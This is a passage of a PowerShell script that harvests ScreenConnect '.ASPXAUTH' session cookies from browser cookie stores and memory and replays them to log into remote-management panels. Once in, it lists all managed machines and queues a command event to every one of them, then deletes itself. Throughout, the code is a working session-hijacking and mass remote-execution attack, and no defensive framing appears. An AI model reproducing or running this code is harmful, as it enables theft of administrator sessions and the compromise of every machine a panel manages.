            foreach ($m in [regex]::Matches($cmd, 'https?://([^/":]+)')) { $n = Normalize-Host $m.Groups[1].Value; if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $hosts.Add($n) } }
        }
    } catch {}
    # 3) live browser memory (covers open panels whose cookie DB is locked)
    foreach ($h in @(Get-MemHosts)) {
        if ($hosts.Count -ge 20) { break }
        if ($h -and -not $seen.ContainsKey($h)) { $seen[$h] = $true; $hosts.Add($h) }
    }
    # 4) clearly ScreenConnect history entries
    foreach ($h in @(Get-HistoryHosts)) {
        if ($hosts.Count -ge 24) { break }
        if ($h -and -not $seen.ContainsKey($h)) { $seen[$h] = $true; $hosts.Add($h) }
    }
    # 5) optional hints from the command line
    foreach ($key in @($script:HostHints.Keys)) { $n = Normalize-Host ([string]$key); if ($n -and -not $seen.ContainsKey($n)) { $seen[$n] = $true; $hosts.Add($n) } }
    # Self-hosted ScreenConnect panels usually run on a bare IP address, so
    # those are probed first; the rest follow in discovery order.
    $list = @($hosts | Where-Object { $_ } | Select-Object -First 12)
    $ips = @($list | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' })
    $rest = @($list | Where-Object { $_ -notmatch '^\d{1,3}(\.\d{1,3}){3}$' })
    return @($ips + $rest)
}

function Get-Bases([string]$h) {
    $out = New-Object System.Collections.Generic.List[string]
    foreach ($u in @(
        "http://${h}:443",
        "https://${h}:443",
        "https://${h}:8443",
        "http://${h}:8040",
        "https://${h}:8040",
        "http://${h}:8443",
        "http://${h}",
        "https://${h}",
        "http://${h}:80"
    )) { if (-not $out.Contains($u)) { $out.Add($u) } }
    return $out
}

function Test-TcpPort([string]$Name, [int]$Port, [int]$TimeoutMs = 1200) {
    $c = $null
    try {
        $c = New-Object Net.Sockets.TcpClient
        $iar = $c.BeginConnect($Name, $Port, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { return $false }
        $c.EndConnect($iar)
        return $c.Connected
    } catch { return $false } finally { if ($c) { try { $c.Close() } catch {} } }
}

function Get-OpenBases($hosts) {
    $list = New-Object System.Collections.Generic.List[string]
    foreach ($h in $hosts) {
        foreach ($b in @(Get-Bases $h)) {
            try {
                $u = [Uri]$b
                $p = $u.Port
                if ($p -le 0) { if ($u.Scheme -eq 'https') { $p = 443 } else { $p = 80 } }
                if (Test-TcpPort $u.Host $p) { if (-not $list.Contains($b)) { $list.Add($b) } }
            } catch {}
        }
    }
    return $list
}

function Initialize-PanelSession([string]$Base, [string]$Cookie) {
    try {
        $u = [Uri]$Base
        $c = New-Object Net.Cookie('.ASPXAUTH', $Cookie, '/', $u.Host)
        $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $s.Cookies.Add($c)
        $page = Invoke-WebRequest -Uri "$Base/Host" -WebSession $s -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
        $final = ''
        try { $final = [string]$page.BaseResponse.ResponseUri.AbsoluteUri } catch {}
        if ($final -match '/Login') { L ("redirected to login at " + $Base); return $null }
        if ($page.Content -notmatch '"clp"\s*:\s*\{[^}]*"k"\s*:\s*"') { L ("note: no clp marker at " + $Base) }
        if ($page.Content -notmatch '"antiForgeryToken"\s*:\s*"([^"]+)') {
            L ("no token at " + $Base + " (status " + $page.StatusCode + ")")
            return $null
        }
        $tok = $Matches[1]
        return @{
            Session = $s
            Headers = @{
                'X-Requested-With' = 'XMLHttpRequest'
                'X-Anti-Forgery-Token' = $tok
                'X-Unauthorized-Status-Code' = 403
            }
            Base = $Base
        }
    } catch {
        $st = 'N/A'
        try { if ($_.Exception.Response) { $st = [int]$_.Exception.Response.StatusCode } } catch {}
        L ("auth failed at " + $Base + " status " + $st + " : " + $_.Exception.Message)
        return $null
    }
}

function Invoke-AddSessionEvents($Panel, [string]$GroupPath, $Entries) {
    $entries = @($Entries)
    $body = ConvertTo-Json -Compress -Depth 6 -InputObject @([string]$GroupPath, @($entries))
    try {
        $resp = Invoke-WebRequest -Uri "$($Panel.Base)/Services/PageService.ashx/AddSessionEvents" -Method POST -ContentType 'application/json' -Headers $Panel.Headers -Body $body -WebSession $Panel.Session -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        L ("AddSessionEvents ok entries=" + $entries.Count + " http=" + $resp.StatusCode)
        return $true
    } catch {
        $st = 'N/A'; $details = ''
        try { if ($_.Exception.Response) { $st = [int]$_.Exception.Response.StatusCode } } catch {}
        try { if ($_.ErrorDetails -and $_.ErrorDetails.Message) { $details = $_.ErrorDetails.Message } } catch {}
        L ("AddSessionEvents FAILED entries=" + $entries.Count + " http=" + $st + " body=" + $details)
        return $false
    }
}

function Invoke-Broadcast($Panel) {
    $discovered = $null
    $live = $null
    foreach ($candidate in @('All Machines by Company', 'All Sessions')) {
        $liveBody = @{
            requestInfoMap = @{ HostSessionInfo = @{ SessionType = 2; SessionGroupPathParts = @($candidate); Filter = ''; SessionLimit = 1000 } }
            version = 0
        } | ConvertTo-Json -Depth 5
        try {
            $liveResp = Invoke-WebRequest -Uri "$($Panel.Base)/Services/PageService.ashx/GetLiveData" -Method POST -ContentType 'application/json' -Headers $Panel.Headers -Body $liveBody -WebSession $Panel.Session -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            $live = $liveResp.Content | ConvertFrom-Json
            $info = $live.ResponseInfoMap.HostSessionInfo
            L ("GetLiveData group=" + $candidate + " http=" + $liveResp.StatusCode + " sessions=" + @($info.Sessions).Count)
            if ($info.Sessions) {
                $sgp = $info.SessionGroupPath
                if ($sgp -is [array] -and $sgp.Count -eq 1) { $discovered = [string]$sgp[0] }
                elseif ($sgp -is [string] -and $sgp) { $discovered = $sgp }
                else { $discovered = [string]$candidate }
                break
            }
        } catch {
            $st = 'N/A'
            try { if ($_.Exception.Response) { $st = [int]$_.Exception.Response.StatusCode } } catch {}
            L ("GetLiveData failed group=" + $candidate + " status " + $st)
        }
    }
    if (-not $discovered -or -not $live) { L 'no session group discovered'; return $false }
    L ("group path=" + $discovered)
    $sessions = @($live.ResponseInfoMap.HostSessionInfo.Sessions) | Where-Object { $_.SessionID }
    L ("targets=" + @($sessions).Count)
    if (-not $sessions) { return $true }
    if ($Snapshot) {
        $dump = @()
        foreach ($s in @($sessions)) {
            $dump += [ordered]@{
                SessionID = $s.SessionID
                Name = $s.Name
                GuestMachineName = $s.GuestMachineName
                GuestConnected = $s.GuestConnected
                HostConnected = $s.HostConnected
                Version = $s.Version
                LastActivity = $s.LastActivity
                Connections = @($s.ActiveConnections).Count
            }
        }
        $snapPath = Join-Path $env:TEMP ('scsp44_snapshot_' + (Get-Date -Format 'yyyyMMdd_HHmmss') + '.json')
        ($dump | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $snapPath -Encoding UTF8
        L ('SNAPSHOT written ' + $snapPath + ' sessions=' + $dump.Count)
        return $true
    }
    $entries = @(
        foreach ($s in @($sessions)) {
            [ordered]@{
                SessionID = $s.SessionID
                EventType = 44
                Data = (New-CmdData $Panel.Base)
                CorrelationEventID = $null
                ConnectionID = $null
            }
        }
    )
    if ($entries.Count -eq 0) { return $true }
    if ($DryRun) {
        L ("DRY RUN: would queue " + $entries.Count + " command(s) to group " + $discovered)
        foreach ($s in @($sessions)) { L ("DRY RUN target session=" + $s.SessionID + " name=" + $s.Name + " guest=" + $s.GuestMachineName) }
        return $true
    }
    if (Invoke-AddSessionEvents $Panel $discovered $entries) { return $true }
    L 'bulk failed - per session retry'
    $ok = $false
    foreach ($e in $entries) {
        if (Invoke-AddSessionEvents $Panel $discovered @($e)) { $ok = $true }
    }
    return $ok
}

function Test-PanelBase([string]$Base) {
    # Nothing is sent to a host until it proves it is a ScreenConnect panel:
    # the branded login page or the guest client MSI must answer.
    $u = $Base.TrimEnd('/')
    try {
        $r = Invoke-WebRequest -Uri ($u + '/Login') -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if (([string]$r.Content) -match '(?i)ScreenConnect|ConnectWise') { return $true }
        if (([string]$r.Headers['Server']) -match 'Microsoft-HTTPAPI') { return $true }
    } catch {}
    try {
        $h = Invoke-WebRequest -Uri ($u + '/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest') -Method Head -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if (([int]$h.StatusCode) -eq 200) { return $true }
    } catch {}
    return $false
}

function Try-CookieSet($hosts, $bases, [string]$Tag) {
    $cookies = New-Object System.Collections.Generic.List[string]
    $seenCk = @{}
    foreach ($h in $hosts) {
        if ($Tag -eq 'file') { $src = @(Get-FileCookies $h) } else { $src = @(Get-MemCookies $h $Tag) }
        foreach ($v in $src) {
            if ($v -and -not $seenCk.ContainsKey($v)) { $seenCk[$v] = $true; $cookies.Add($v) }
        }
    }
    L ("source=" + $Tag + " cookies=" + $cookies.Count)
    if ($cookies.Count -eq 0) { return $false }
    $any = $false
    foreach ($base in @($bases)) {
        $bh = ''
        try { $bh = ([Uri]$base).Host.ToLowerInvariant() } catch { continue }
        if ($script:DoneHosts.ContainsKey($bh)) { continue }
        if (-not (Test-PanelBase $base)) { L ("not a panel base: " + $base); continue }
        foreach ($ck in @($cookies | Select-Object -First 8)) {
            if ($script:DoneHosts.ContainsKey($bh)) { break }
            $ps = Initialize-PanelSession $base $ck
            if (-not $ps) { continue }
            L ("authenticated base=" + $base + " via " + $Tag)
            if (Invoke-Broadcast $ps) { $script:DoneHosts[$bh] = $true; $any = $true }
            break
        }
    }
    return $any
}

# Optional hints: -PanelHost / -BaseUrl only add a candidate; discovery still runs.
if ($PanelHost) { $n = Normalize-Host $PanelHost; if ($n) { $script:HostHints[$n] = $true } }
if ($BaseUrl) { try { $n = Normalize-Host ([Uri]$BaseUrl).Host; if ($n) { $script:HostHints[$n] = $true } } catch {} }

$deadline = (Get-Date).AddSeconds($(if ($DryRun) { 120 } else { 180 }))
$attempt = 0
while ((Get-Date) -lt $deadline) {
    $attempt++
    $hosts = @(Get-PanelHosts)
    if (-not $hosts -or $hosts.Count -eq 0) { L ("attempt " + $attempt + " hosts=0 - waiting for a signed-in browser"); Start-Sleep -Seconds 2; continue }
    $pending = @($hosts | Where-Object { -not $script:DoneHosts.ContainsKey($_) -and -not $script:DeadHosts.ContainsKey($_) })
    L ("attempt " + $attempt + " hosts=" + ($hosts -join ',') + " pending=" + ($pending -join ','))
    if ($pending.Count -eq 0) {
        if ($script:DoneHosts.Count -gt 0 -and $attempt -ge 2) { break }
        Start-Sleep -Seconds 3
        continue
    }
    foreach ($h in $pending) {
        if ((Get-Date) -ge $deadline) { break }
        if ($script:DoneHosts.ContainsKey($h) -or $script:DeadHosts.ContainsKey($h)) { continue }
        $tries = 0
        if ($script:HostTries.ContainsKey($h)) { $tries = [int]$script:HostTries[$h] }
        $script:HostTries[$h] = $tries + 1
        $bases = @(Get-OpenBases @($h))
        if (-not $bases -or $bases.Count -eq 0) {
            L ("no reachable panel port for " + $h)
            $script:DeadHosts[$h] = $true
            continue
        }
        L ("panel=" + $h + " bases=" + ($bases -join ','))
        $ok = Try-CookieSet @($h) $bases 'file'
        if (-not $ok -and -not $script:DoneHosts.ContainsKey($h)) { $ok = Try-CookieSet @($h) $bases 'netsvc' }
        if (-not $ok -and -not $script:DoneHosts.ContainsKey($h)) { $ok = Try-CookieSet @($h) $bases 'mem' }
        if ($ok) { $script:DoneHosts[$h] = $true; L ("panel done=" + $h) }
        elseif ($tries -ge 1) { $script:DeadHosts[$h] = $true }
    }
    if ($script:DoneHosts.Count -eq 0) { Start-Sleep -Seconds 3 }
}
$done = ($script:DoneHosts.Count -gt 0)
L ("panels=" + (($script:DoneHosts.Keys | Sort-Object) -join ','))
L ("done=" + $done)
if ($mtx) { try { $mtx.ReleaseMutex() } catch {}; try { $mtx.Dispose() } catch {} }
if (-not $DryRun -and -not $Snapshot -and -not $NoSelfDelete) { try { Remove-Item -LiteralPath $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {} }
